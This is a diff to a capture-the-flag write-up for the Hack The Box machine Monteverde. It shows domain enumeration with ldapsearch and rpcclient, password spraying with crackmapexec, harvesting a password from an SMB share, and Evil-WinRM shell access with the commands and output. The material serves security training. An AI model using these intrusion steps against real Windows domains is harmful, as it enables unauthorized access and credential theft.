@@ -9,8 +9,8 @@ avatar: assets/htb/monteverde.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Monteverde
 ---
-## 
-Useful Skills and Tools
+
+## Useful Skills and Tools
 
 #### Using ldapsearch to enumerate a Windows domain
 
@@ -33,8 +33,7 @@ Useful Skills and Tools
 
 `crackmapexec smb <YOUR_IP> -u users.txt -p users.txt`
 
-#### 
-Connect to a Windows computer through Windows Remote Management \(WinRM\)
+#### Connect to a Windows computer through Windows Remote Management \(WinRM\)
 
 `evil-winrm -i <ip> -u <username> -p '<password>'`
 
@@ -47,16 +46,14 @@ Connect to a Windows computer through Windows Remote Management \(WinRM\)
 * Remote Management Users
 * Azure Admins
 
-## 
-Enumeration
+## Enumeration
 
-### 
-Nmap scan
+### Nmap scan
 
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the nmap output with a filename of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -oN monteverde.nmap <YOUR_IP>
+kac0@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -oN monteverde.nmap <YOUR_IP>
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 10:42 EDT
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
@@ -65,7 +62,7 @@ Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.  This behavior seems to be more common on Windows machines, as I also encountered this on `Nest` and `Oouch`. 
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -Pn -oN monteverde.nmap <YOUR_IP>
+kac0@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -Pn -oN monteverde.nmap <YOUR_IP>
 
 # Nmap 7.80 scan initiated Thu May 28 13:42:58 2020 as: nmap -p- -sC -sV -Pn -oN monteverde-full <YOUR_IP>
 Nmap scan report for <YOUR_IP>
@@ -133,7 +130,7 @@ From these results I could see a lot of open ports! Since ports `88 - kerberos`,
 Since I had so many options, I decided to start by enumerating Active Directory through LDAP using `ldapsearch`. This command is built into many linux distros and returned a wealth of information. I snipped out huge chunks of the output in order to reduce information overload as most of it was not particularly interesting in this case. _Warning! The output from `ldapsearch` can be quite extensive, so be prepared to wade through a lot of data till you find anything useful.  I have snipped out the irrelevant sections below._
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s base -b "DC=megabank,DC=local"
+kac0@kalimaa:~/htb/monteverde$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s base -b "DC=megabank,DC=local"
 
 ...snipped for brevity...
 
@@ -485,7 +482,7 @@ dSCorePropagationData: 16010101000000.0Z
 Next I used `rpcclient` to validate the information I found through LDAP using the following RPC commands:  `enumdomusers` - enumerate domain users, `queryuser <RID -or- last 4 of SID>` - get details about a specific user, `enumalsgroups builtin` - list all available built-in groups , and `queryaliasmem builtin <RID>` - to get the SIDs of the members of a specific built-in group.
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ rpcclient -U "" -N <YOUR_IP>
+kac0@kalimaa:~/htb/monteverde$ rpcclient -U "" -N <YOUR_IP>
 
 rpcclient $> enumdomusers
 user:[Guest] rid:[0x1f5]
@@ -577,7 +574,7 @@ There was no interesting information in the other users other than the business 
 I was not able to login as the most promising user, `mhope`, without a password, so I still had to figure out which user would give me a foothold on the machine.   With no credentials found anywhere, I decided to try a different tactic.  Perhaps someone had been lazy and used their username as their password.  To test for this, I created a list of usernames and used this to try to login to SMB using a tool called `crackmapexec.` I tried each username combination until one worked. Apparently we had a lazy administrator who had created the `SABatchJobs` service account using the username as the password.
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ crackmapexec smb <YOUR_IP> -u users.txt -p users.txt
+kac0@kalimaa:~/htb/monteverde$ crackmapexec smb <YOUR_IP> -u users.txt -p users.txt
 
 SMB         <YOUR_IP>    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
 SMB         <YOUR_IP>    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
@@ -610,7 +607,7 @@ crackmapexec smb <YOUR_IP> -u users -p users [https://github.com/byt3bl33d3r/Cra
 ### Enumeration as user `SABatchJobs` 🐇
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK -L \\\\<YOUR_IP>\\ -U SABatchJobs
+kac0@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK -L \\\\<YOUR_IP>\\ -U SABatchJobs
 Enter MEGABANK\SABatchJobs's password: 
 
         Sharename       Type      Comment
@@ -627,7 +624,7 @@ SMB1 disabled -- no workgroup available
 ```
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\<YOUR_IP>\\SYSVOL -U SABatchJobs
+kac0@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\<YOUR_IP>\\SYSVOL -U SABatchJobs
 Enter MEGABANK\SABatchJobs's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -704,7 +701,7 @@ MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
 ...password policy...other than that nothing at all useful...
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\<YOUR_IP>\\azure_uploads -U SABatchJobs
+kac0@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\<YOUR_IP>\\azure_uploads -U SABatchJobs
 Enter MEGABANK\SABatchJobs's password: 
 Try "help" to get a list of possible commands.
 smb: \>
@@ -715,7 +712,7 @@ smb: \>
 ## Road to User
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\<YOUR_IP>\\users$ -U SABatchJobs
+kac0@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\<YOUR_IP>\\users$ -U SABatchJobs
 Enter MEGABANK\SABatchJobs's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -763,7 +760,7 @@ getting file \mhope\azure.xml of size 1212 as azure.xml (1.8 KiloBytes/sec) (ave
 ...we have a password for \`mhope\`!...since mhope was a member of the `Remote Management Users` group...`Evil-WinRM` is a great tool to gain access...
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ evil-winrm -i <YOUR_IP> -u mhope 
+kac0@kalimaa:~/htb/monteverde$ evil-winrm -i <YOUR_IP> -u mhope 
 Enter Password: 
 
 Evil-WinRM shell v2.3
@@ -816,7 +813,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ```text
 *Evil-WinRM* PS C:\Users\mhope\Documents> cat ../Desktop/user.txt
-8d6d****3cec
+8d6d************************3cec
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -1020,5 +1017,5 @@ With the `Administrator` password in hand, it was simple to login using `evil-wi
 
 ```text
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-a44e****b5b3
+a44e************************b5b3
 ```
